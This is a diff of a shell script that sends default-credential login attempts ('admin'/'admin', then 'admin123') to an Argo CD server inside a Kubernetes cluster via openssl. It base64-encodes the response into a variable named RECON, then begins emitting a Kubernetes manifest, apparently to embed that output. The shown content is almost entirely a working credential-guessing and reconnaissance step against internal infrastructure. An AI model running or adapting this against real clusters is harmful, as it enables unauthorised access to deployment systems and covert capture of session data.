@@ -1,6 +1,6 @@
 #!/bin/sh
 RECON=$( (
-printf 'POST /api/v1/session HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nContent-Type: application/json\r\nContent-Length: 42\r\nConnection: close\r\n\r\n{"username":"admin","password":"admin"}' | timeout 5 openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null
+echo LOGIN_TEST; echo -e 'POST /api/v1/session HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nContent-Type: application/json\r\nContent-Length: 44\r\nConnection: close\r\n\r\n{"username":"admin","password":"admin123"}' | timeout 5 openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 2>/dev/null; echo DONE
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
